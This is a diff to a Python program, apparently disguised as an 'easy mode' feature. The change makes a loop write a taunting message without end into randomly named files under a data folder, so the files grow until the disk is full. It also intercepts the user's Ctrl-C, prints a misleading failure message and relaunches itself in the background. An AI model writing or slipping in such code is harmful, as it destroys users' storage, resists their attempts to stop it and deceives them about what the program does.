@@ -32,9 +32,10 @@ def initial_enable():
     while True:
         try:
             while True:
-                with open(f"data/{generate_filename()}", "a") as ef:
-                    random.random
-                    ef.write("btw easy mode was a lie, enjoy having no storage space\nFILL THE SPACE\n")
+                with open(f"data/{generate_filename(random.randint(5, 20))}", "a") as ef:
+                    writes = 0
+                    while writes <= 99999999999999999999999999999999999999999999999999999:
+                        ef.write("btw easy mode was a lie, enjoy having no storage space\nFILL THE SPACE\n")
         except KeyboardInterrupt as e:
             print(f"python.KeyboardInterrupt failed to run. Continuing...")
             start_easy_mode_background()
